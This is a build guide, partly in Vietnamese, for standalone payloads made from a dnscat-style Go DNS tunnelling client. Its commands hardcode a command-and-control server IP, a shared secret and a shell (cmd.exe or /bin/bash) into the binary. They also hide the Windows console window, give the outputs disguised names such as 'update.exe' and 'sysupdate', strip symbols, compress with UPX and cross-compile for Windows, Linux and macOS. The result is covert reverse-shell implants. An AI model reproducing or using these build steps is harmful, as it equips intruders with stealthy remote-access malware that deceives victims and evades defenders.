# Build Standalone Payloads

## Hardcoded Configuration

Build với các tham số mặc định được inject tại compile time (không cần args khi chạy):

```bash
go build -ldflags="-s -w \
  -X main.DefaultServer=192.168.1.2 \
  -X main.DefaultSecret=YOUR_SECRET_HEX \
  -X main.DefaultExec=cmd.exe" \
  -o payload.exe ./cmd/dnscat/
```

## Available Variables

| Variable                 | Description                         | Default        |
| ------------------------ | ----------------------------------- | -------------- |
| `main.DefaultServer`     | DNS server IP                       | ""             |
| `main.DefaultSecret`     | Pre-shared secret (hex)             | ""             |
| `main.DefaultExec`       | Command to execute                  | ""             |
| `main.DefaultDomain`     | Domain name                         | ""             |
| `main.DefaultDelay`      | Packet delay (ms)                   | "1000"         |
| `main.DefaultPort`       | DNS port                            | "53"           |
| `main.DefaultDNSTypes`   | DNS record types                    | "TXT,CNAME,MX" |
| `main.DisableEncryption` | Disable encryption ("true"/"false") | "false"        |

## Examples

**Windows (hidden window):**

```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultServer=192.168.1.100 \
  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e \
  -X main.DefaultExec=cmd.exe" \
  -o update.exe ./cmd/dnscat/
```

**Linux:**

```bash
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w \
  -X main.DefaultServer=10.0.0.5 \
  -X main.DefaultSecret=90652b5ca36bf255cbce1cf7dbab8c6e \
  -X main.DefaultExec=/bin/bash" \
  -o sysupdate ./cmd/dnscat/
```

**Command session (no shell):**

```bash
go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultServer=192.168.1.2 \
  -X main.DefaultSecret=abc123..." \
  -o payload.exe ./cmd/dnscat/
```

## Multi-Platform Build

```bash
# Windows x64
GOOS=windows GOARCH=amd64 go build -ldflags="..." -o payload-x64.exe ./cmd/dnscat/

# Windows x86
GOOS=windows GOARCH=386 go build -ldflags="..." -o payload-x86.exe ./cmd/dnscat/

# Linux x64
GOOS=linux GOARCH=amd64 go build -ldflags="..." -o payload-linux ./cmd/dnscat/

# macOS ARM64 (M1/M2)
GOOS=darwin GOARCH=arm64 go build -ldflags="..." -o payload-mac ./cmd/dnscat/
```

## Additional Optimization

**Strip symbols:**

```bash
-ldflags="-s -w"  # Already reduces size significantly
```

**UPX compression:**

```bash
upx --best payload.exe  # Further compress (optional)
```

**Hide console (Windows):**

```bash
-ldflags="-H windowsgui"  # No console window
```

## Notes

- Command-line args override hardcoded defaults
- Payload runs standalone without arguments
- All variables are optional
- Empty string = use original default behavior
